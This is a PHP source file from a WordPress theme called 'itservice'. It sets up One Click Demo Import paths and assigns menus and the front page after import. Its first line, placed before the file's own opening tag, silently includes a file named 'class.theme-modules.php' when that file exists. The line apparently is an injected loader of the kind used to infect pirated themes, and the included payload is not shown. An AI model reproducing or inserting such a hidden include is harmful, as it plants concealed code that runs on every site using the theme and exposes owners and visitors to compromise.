<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

function its_ocdi_import_files() {
    $dd_path = trailingslashit( get_template_directory() ) . 'demo-content/';
    return apply_filters( 'its_ocdi_files_args', array(
        array(
            'import_file_name'             => 'itservice',
            'categories'                   => array( 'itservice' ),
            'local_import_file'            => $dd_path . 'demo-content.xml',

            'import_preview_image_url'     => trailingslashit( get_template_directory_uri() ) . 'screenshot.png',
            'import_notice'                => esc_html__( 'Import process may take 10-15 minutes. If you facing any issues please contact our support.', 'itservice' ),
        ),
    ) );
}

function its_ocdi_after_import_setup( $selected_import ) {
    
    // Assign menus to their locations.
    $menu_navigation        = get_term_by( 'name', 'Main Navigation', 'nav_menu' );

    set_theme_mod( 'nav_menu_locations', array(
               'menu-navigation'           => $menu_navigation->term_id,
           )
        );

        // Assign front page and posts page (blog page) and other WooCommerce pages
    $front_page_id      = get_page_by_title( 'Home' );

    update_option( 'show_on_front', 'page' );
    update_option( 'page_on_front', $front_page_id->ID );

}

